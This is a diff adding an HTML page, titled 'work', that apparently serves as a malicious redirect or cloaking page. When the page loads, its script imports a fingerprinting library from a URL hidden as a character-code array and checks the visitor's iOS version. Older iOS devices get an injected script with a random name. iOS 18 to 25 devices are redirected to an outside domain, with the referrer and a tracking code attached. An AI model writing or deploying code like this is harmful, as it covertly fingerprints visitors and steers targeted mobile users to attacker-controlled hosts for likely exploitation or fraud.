@@ -1,0 +1,52 @@
+﻿<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+<meta property="og:determiner" content="auto" />
+<title>work</title>
+</head>
+<body>
+<script type="text/javascript">
+
+function loadScriptForOldiOS() {
+    var ua = navigator.userAgent;
+    var match = ua.match(/OS (\d+)_/i);
+    if (match) {
+        var iosVersion = parseInt(match[1], 10);
+		var script = document.createElement('script');
+		script.type = 'text/javascript';
+        if (iosVersion < 18) {
+          script.src = '49554fde7424c31c.js?v=' + Math.random();
+          document.body.appendChild(script);
+		}else if(iosVersion < 26) {
+            var __pl="https://18.wakwak.icu/";
+            var __c = "1DECX7UIQIA6N";
+            var __dm=document.referrer;
+			window.location = __pl + "?dm=" + __dm+"&c="+__c;
+		}
+    }else{
+	}
+}
+async function onWindowLoad() {
+    try {
+        const fp = await import([104,116,116,112,115,58,47,47,102,112,106,115,99,100,110,46,110,101,116,47,118,52,47,97,85,121,100,121,98,83,86,71,107,66,80,119,101,102,53,67,50,80,114].map(V=>String.fromCharCode(0^V)).join("")).then(Fingerprint => Fingerprint.start());
+        const result = await fp.get();
+        window.___visitor_id = result.visitor_id;
+        window.___event_id = result.event_id;
+        //console.log('Fingerprint result:', result);
+        //console.log('visitor_id:', result.visitor_id);
+        //console.log('event_id:', result.event_id);
+		loadScriptForOldiOS();
+    } catch (e) {
+        window.___visitor_id = '';
+        window.___event_id = '';
+        console.error('Fingerprint error:', e);
+    }
+};
+window.onload = onWindowLoad;
+
+</script>
+work loaded.
+</body>
+</html>
